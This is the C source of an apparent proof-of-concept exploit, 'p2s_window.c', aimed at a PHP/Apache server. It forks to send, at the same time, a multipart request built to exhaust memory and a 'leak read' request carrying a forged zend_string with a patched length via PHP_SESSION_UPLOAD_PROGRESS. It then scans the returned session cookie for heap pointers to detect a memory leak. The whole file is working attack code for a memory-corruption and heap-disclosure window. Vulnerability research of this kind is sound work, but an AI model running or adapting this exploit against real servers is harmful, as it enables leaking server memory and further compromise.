/* p2s_window.c — concurrent OOM + leak read (corruption window catcher)
 *
 * fork() ile CONCURRENT: child OOM, parent leak read — aynı anda.
 * eness OOM'u 200 döner (soft OOM), sonra crash → corruption window.
 *
 * Build:  cc -O2 -o p2s_window p2s_window.c
 * Run:    ./p2s_window [host] [port] [oom_mb] [tries]
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <errno.h>

static const char *HOST = "192.168.8.123";
static int PORT = 18113;
static int OOM_MB = 12;
static int TRIES = 5;

#define OOM_BND "S17"
#define LEAK_BND "BNDRY12345"

/* ---------- body builder helper ---------- */

typedef struct {
    char *buf;
    unsigned long off;
    unsigned long cap;
} B;

static void b_str(B *b, const char *s) {
    size_t n = strlen(s);
    if (b->off + n > b->cap) return;
    memcpy(b->buf + b->off, s, n);
    b->off += n;
}
static void b_bytes(B *b, char c, unsigned long n) {
    if (b->off + n > b->cap) return;
    memset(b->buf + b->off, c, n);
    b->off += n;
}
static void b_raw(B *b, const void *p, size_t n) {
    if (b->off + n > b->cap) return;
    memcpy(b->buf + b->off, p, n);
    b->off += n;
}

/* ---------- OOM body ---------- */

static unsigned long build_oom_body(char *buf, unsigned long cap) {
    B b = {buf, 0, cap};
    char tmp[256];

    for (int i = 0; i < 1001; i++) {
        int n = snprintf(tmp, sizeof(tmp),
            "--%s\r\n"
            "Content-Disposition: form-data; name=\"p%04d\"\r\n"
            "\r\n"
            "x\r\n", OOM_BND, i);
        b_raw(&b, tmp, n);
    }
    /* PHPSESSID = \x00 */
    b_str(&b, "--S17\r\n"
        "Content-Disposition: form-data; name=\"PHPSESSID\"\r\n"
        "\r\n");
    b_raw(&b, "\x00", 1);
    b_str(&b, "\r\n");
    /* PROGRESS */
    b_str(&b, "--S17\r\n"
        "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n"
        "\r\n"
        "pwn\r\n");
    /* file */
    b_str(&b, "--S17\r\n"
        "Content-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\n"
        "Content-Type: application/octet-stream\r\n"
        "\r\n");
    b_bytes(&b, 'A', 64);
    b_str(&b, "\r\n");
    /* big field */
    b_str(&b, "--S17\r\n"
        "Content-Disposition: form-data; name=\"big\"\r\n"
        "\r\n");
    b_bytes(&b, 'B', (unsigned long)OOM_MB * 1024 * 1024);
    b_str(&b, "\r\n--S17--\r\n");
    return b.off;
}

/* ---------- leak read body ---------- */

static unsigned long build_leak_body(char *buf, unsigned long cap) {
    B b = {buf, 0, cap};
    char tmp[256];

    b_str(&b, "--BNDRY12345\r\n"
        "Content-Disposition: form-data; name=\"PHPSESSID\"\r\n"
        "\r\n"
        "attacksessionid0001\r\n");
    b_str(&b, "--BNDRY12345\r\n"
        "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n"
        "\r\n"
        "pwn\r\n");
    for (int i = 0; i < 841; i++) {
        int n = snprintf(tmp, sizeof(tmp),
            "--BNDRY12345\r\n"
            "Content-Disposition: form-data; name=\"%d\"\r\n"
            "\r\n"
            "v%04d", 1000 + i, i);
        b_raw(&b, tmp, n);
        b_bytes(&b, 'x', 44);
        b_str(&b, "\r\n");
    }
    /* forged zend_string: 79 bytes */
    b_str(&b, "--BNDRY12345\r\n"
        "Content-Disposition: form-data; name=\"1999\"\r\n"
        "\r\n");
    b_bytes(&b, 'A', 79);
    /* patch: len at +0x10, data[0] at +0x18 */
    unsigned long long len = 0x1000;
    memcpy(b.buf + b.off - 79 + 0x10, &len, 8);
    b.buf[b.off - 79 + 0x18] = 'L';
    b_str(&b, "\r\n--BNDRY12345--\r\n");
    return b.off;
}

/* ---------- HTTP ---------- */

static int http_post(const char *body, unsigned long body_len,
                     const char *boundary, char *resp, int resp_size) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    inet_pton(AF_INET, HOST, &addr.sin_addr);
    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) { close(fd); return -1; }
    int one = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

    char hdr[512];
    int hdr_len = snprintf(hdr, sizeof(hdr),
        "POST / HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %lu\r\n"
        "Connection: close\r\n\r\n",
        HOST, PORT, boundary, body_len);

    if (send(fd, hdr, hdr_len, MSG_NOSIGNAL) < 0) { close(fd); return -1; }
    if (send(fd, body, body_len, MSG_NOSIGNAL) < 0) { close(fd); return -1; }

    int total = 0;
    while (total < resp_size) {
        int n = recv(fd, resp + total, resp_size - total, 0);
        if (n <= 0) break;
        total += n;
    }
    close(fd);
    return total;
}

static int get_status(const char *resp) {
    int st = 0;
    if (resp && resp[0] && strncmp(resp, "HTTP/", 5) == 0)
        sscanf(resp + 5, "%*c %d", &st);
    return st;
}

static int cookie_len(const char *resp) {
    const char *p = strstr(resp, "Set-Cookie: PHPSESSID=");
    if (!p) return 0;
    p += 22;
    int n = 0;
    while (*p && *p != ';' && *p != '\r' && *p != '\n') { n++; p++; }
    return n;
}

static int heap_ptrs(const unsigned char *buf, int len) {
    int cnt = 0;
    for (int i = 0; i + 8 <= len; i++) {
        unsigned long long v = 0;
        for (int j = 0; j < 8; j++) v |= (unsigned long long)buf[i+j] << (8*j);
        if (v >= 0x7F0000000000ULL && v < 0x800000000000ULL) cnt++;
    }
    return cnt;
}

/* ---------- main ---------- */

int main(int argc, char **argv) {
    if (argc > 1) HOST = argv[1];
    if (argc > 2) PORT = atoi(argv[2]);
    if (argc > 3) OOM_MB = atoi(argv[3]);
    if (argc > 4) TRIES = atoi(argv[4]);

    unsigned long oom_cap = (unsigned long)OOM_MB * 1024 * 1024 + 256 * 1024;
    char *oom_body = malloc(oom_cap);
    unsigned long oom_len = build_oom_body(oom_body, oom_cap);
    if (!oom_len) { fprintf(stderr, "OOM body build failed\n"); return 1; }

    unsigned long leak_cap = 64 * 1024;
    char *leak_body = malloc(leak_cap);
    unsigned long leak_len = build_leak_body(leak_body, leak_cap);
    if (!leak_len) { fprintf(stderr, "leak body build failed\n"); return 1; }

    char *leak_resp = malloc(1 << 20);

    printf("%5s | %7s | %8s | %5s | %s\n",
           "try", "stLeak", "cookie", "cnt", "signal");
    printf("--------------------------------------------------\n");

    for (int t = 0; t < TRIES; t++) {
        pid_t pid = fork();
        if (pid < 0) { perror("fork"); return 1; }

        if (pid == 0) {
            /* CHILD: fire OOM */
            char *oom_resp = malloc(65536);
            http_post(oom_body, oom_len, OOM_BND, oom_resp, 65536);
            free(oom_resp);
            _exit(0);
        } else {
            /* PARENT: fire leak read (concurrent with OOM) */
            int rlen = http_post(leak_body, leak_len, LEAK_BND,
                                 leak_resp, 1 << 20);
            int status = get_status(leak_resp);
            int clen = cookie_len(leak_resp);
            int cnt = heap_ptrs((unsigned char *)leak_resp, rlen);
            const char *sig = (clen > 100 && cnt >= 8) ? "LEAK!" :
                              (clen > 100) ? "big" : "clean";

            printf("%5d | %7d | %7dB | %5d | %s\n",
                   t + 1, status, clen, cnt, sig);
            fflush(stdout);

            waitpid(pid, NULL, 0);
        }
        usleep(800000); /* 0.8s between tries — let Apache re-fork */
    }

    printf("--------------------------------------------------\n");
    free(oom_body); free(leak_body); free(leak_resp);
    return 0;
}
